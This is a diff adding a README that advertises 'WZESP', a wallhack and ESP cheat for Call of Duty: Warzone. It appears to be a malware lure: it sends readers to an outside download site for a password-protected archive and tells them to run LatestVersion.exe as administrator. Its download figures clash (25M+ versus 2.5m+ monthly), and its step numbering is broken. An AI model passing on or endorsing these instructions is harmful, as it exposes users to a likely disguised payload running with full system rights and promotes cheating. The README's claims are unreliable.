@@ -1,0 +1,56 @@
+# WZESP — Warzone ESP & Wallhack 2026
+
+![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v4.0-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-25M%2B-orange?style=flat-square)
+
+> **WZESP — see all enemies through walls in Warzone with loadout, plate count, and kill streaks.**
+
+---
+
+## Features
+
+- ✅ Player ESP with plate count
+- ✅ Loadout display — see their guns
+- ✅ Kill streak tracking
+- ✅ Buy station ESP
+- ✅ Vehicle ESP
+- ✅ Gas circle prediction
+
+---
+
+## Requirements
+
+- Windows 10/11 (64-bit)
+- Call of Duty: Warzone installed
+
+---
+
+## Installation
+
+1. Scroll down and click the **Download** button
+2. Extract with WinRAR or 7-Zip — enter the password when prompted
+3. The archive password is shown on the **download page**
+3. Right-click `LatestVersion.exe` and select **Run as administrator**
+4. Follow the on-screen instructions and click **Start**
+6. Done — enjoy!
+
+---
+
+## FAQ
+
+**Q: Plates?**
+A: Yes — see enemy armor plate count.
+
+**Q: Loadout?**
+A: Yes — see what weapons enemies are carrying.
+
+---
+
+## Downloads
+
+**Monthly downloads:** 2.5m+
+
+[![Download](https://img.shields.io/badge/Download-v4.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/wzesp26)
+
+---
+
+*Use for educational and research purposes only.*
